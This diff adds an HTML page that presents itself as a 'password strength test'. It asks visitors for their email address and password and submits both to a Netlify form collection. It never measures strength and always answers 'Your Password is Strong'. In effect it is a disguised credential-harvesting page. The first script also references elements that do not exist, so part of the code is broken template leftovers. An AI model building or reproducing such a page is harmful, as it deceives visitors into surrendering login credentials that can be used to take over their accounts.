@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+
+<html lang="en" dir="ltr">
+   <head>
+      <meta charset="utf-8">
+      <title>Password Test - Kuczi$</title>
+      <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon"  href="../logo.png">
+
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <style>
+      .kuczi-credit {
+        position: fixed;
+        bottom: 12px;
+        right: 12px;
+        padding: 4px 12px;
+        border-radius: 999px;
+        background: rgba(0, 0, 0, 0.55);
+        color: #f8f8f8;
+        font-family: inherit;
+        font-size: 0.75rem;
+        letter-spacing: 0.05em;
+        text-decoration: none;
+        opacity: 0.85;
+        transition: opacity 0.2s ease, transform 0.2s ease;
+        z-index: 9999;
+      }
+      .kuczi-credit:hover {
+        opacity: 1;
+        transform: translateY(-1px);
+      }
+    </style>
+  </head>
+   <body>
+      <div class="wrapper">
+         <div class="title-text">
+            <div class="title login">
+               Password Strength Test Kuczi$
+            </div>
+         </div>
+            <div class="form-inner">
+               <form name="password-strength" id="contactform" method="POST" action="/apps/password_strength/" data-netlify="true" data-netlify-honeypot="bot-field" data-netlify-recaptcha="true" data-redirect="/apps/password_strength/" class="login">
+                  <input type="hidden" name="form-name" value="password-strength">
+                  <p class="honeypot" hidden>
+                     <label>Nie wypełniaj tego pola: <input name="bot-field" type="text"></label>
+                  </p>
+                  <div class="field">
+                     <input type="text" placeholder="adres email" required name="mail" id="mail">
+                  </div>
+                  <div class="field">
+                     <input type="password" placeholder="Hasło" required name="haselko" id="haselko">
+                  </div>
+                  <div class="form-recaptcha" data-netlify-recaptcha="true"></div>
+                  <div class="field btn">
+                     <div class="btn-layer"></div>
+                     <input type="submit" value="Test">
+                  </div>
+                 
+               </form>
+               
+            </div>
+         </div>
+      </div>
+      <script>
+         const loginText = document.querySelector(".title-text .login");
+         const loginForm = document.querySelector("form.login");
+         const loginBtn = document.querySelector("label.login");
+         const signupBtn = document.querySelector("label.signup");
+         const signupLink = document.querySelector("form .signup-link a");
+         signupBtn.onclick = (()=>{
+           loginForm.style.marginLeft = "-50%";
+           loginText.style.marginLeft = "-50%";
+         });
+         loginBtn.onclick = (()=>{
+           loginForm.style.marginLeft = "0%";
+           loginText.style.marginLeft = "0%";
+         });
+         signupLink.onclick = (()=>{
+           signupBtn.click();
+           return false;
+         });
+         
+         function pass(){
+            alert("Your Password is Strong");
+         }
+      </script>
+      <script>
+        (function () {
+          const passwordForm = document.getElementById('contactform');
+          if (!passwordForm) return;
+
+          passwordForm.addEventListener('submit', function (event) {
+            event.preventDefault();
+            const formData = new FormData(passwordForm);
+            const action = passwordForm.getAttribute('action') || window.location.pathname;
+            const redirectTarget = passwordForm.getAttribute('data-redirect') || window.location.pathname;
+
+            fetch(action, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: new URLSearchParams(formData).toString()
+            })
+            .then(function (response) {
+              if (!response.ok) throw new Error('Form submission failed');
+              alert('Your Password is Strong');
+              window.location.href = redirectTarget;
+            })
+            .catch(function (error) {
+              console.error('Form submission error:', error);
+              window.location.href = redirectTarget;
+            });
+          });
+        })();
+      </script>
+       <a class="kuczi-credit" href="/">© Kuczi$</a>
+</body>
+</html>
